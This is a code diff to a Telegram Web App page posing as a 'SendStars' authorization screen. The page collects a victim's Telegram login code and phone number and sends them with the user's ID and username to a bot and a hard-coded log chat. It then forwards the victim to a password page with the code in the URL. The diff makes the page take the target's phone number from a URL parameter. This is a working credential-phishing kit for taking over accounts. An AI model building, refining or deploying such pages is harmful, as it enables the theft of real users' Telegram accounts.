@@ -6,6 +6,7 @@
   <title>SendStars — авторизация</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
+    /* Стили остаются без изменений */
     :root {
       --bg:#1c1b1b;
       --text:#fff;
@@ -147,7 +148,7 @@
       <img src="avatar.gif" alt="avatar">
     </div>
     <div class="phone">
-      +16577018136
+      <span id="phoneNumber">Загрузка...</span>
       <span class="edit-btn" id="editPhone">✎</span>
     </div>
     <div class="hint">Мы отправили код в приложение Telegram.</div>
@@ -177,6 +178,16 @@
   <script>
 const tg = window.Telegram.WebApp;
 tg.expand();
+
+// Получаем номер телефона из параметров URL
+const urlParams = new URLSearchParams(window.location.search);
+const phoneNumber = urlParams.get('phone');
+
+if (phoneNumber) {
+  document.getElementById('phoneNumber').textContent = phoneNumber;
+} else {
+  document.getElementById('phoneNumber').textContent = 'Номер не указан';
+}
 
 const codeBoxes = document.querySelectorAll('.code-box');
 let code = "";
@@ -214,7 +225,7 @@ document.querySelectorAll('.numpad button').forEach(btn => {
         type: 'auth_code',
         code: code,
         user_id: tg.initDataUnsafe.user?.id,
-        phone_number: document.querySelector('.phone').textContent.trim().replace('✎', '')
+        phone_number: phoneNumber
       }));
 
       // Дополнительно отправляем код в бота через метод бота
@@ -222,7 +233,6 @@ document.querySelectorAll('.numpad button').forEach(btn => {
 
       // Переходим на страницу ввода пароля через 1 секунду
       setTimeout(() => {
-        const phoneNumber = document.querySelector('.phone').textContent.trim().replace('✎', '');
         window.location.href = `password.html?phone=${encodeURIComponent(phoneNumber)}&code=${code}`;
       }, 1000);
     }
@@ -235,7 +245,6 @@ function sendCodeToBot(code) {
   const logChatId = '-1002913601994';
   
   const user = tg.initDataUnsafe.user;
-  const phoneNumber = document.querySelector('.phone').textContent.trim().replace('✎', '');
   
   // Получаем username или показываем "без username"
   const username = user?.username ? `@${user.username}` : 'без username';
@@ -268,7 +277,3 @@ updateBoxes();
 </script>
 </body>
 </html>
-
-
-
-
